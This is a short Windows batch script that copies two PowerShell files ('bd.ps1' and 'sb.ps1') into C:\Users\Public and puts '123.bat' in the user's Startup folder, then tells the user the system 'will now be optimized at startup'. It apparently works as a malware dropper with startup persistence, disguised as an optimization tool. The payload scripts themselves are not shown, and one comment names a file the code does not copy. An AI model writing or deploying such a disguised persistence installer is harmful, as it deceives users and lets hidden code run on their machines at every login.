@echo off

set "sourceDir=%~dp0"
set "destinationDir=C:\Users\Public"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Copy bd.ps1 and sd.ps1 to C:\Users\Public
copy "%sourceDir%bd.ps1" "%destinationDir%"
copy "%sourceDir%sb.ps1" "%destinationDir%"

REM Copy 123.bat to the startup folder
copy "%sourceDir%123.bat" "%startupFolder%"

echo Files copied successfully.
echo your system will now be optimized at startup!

pause
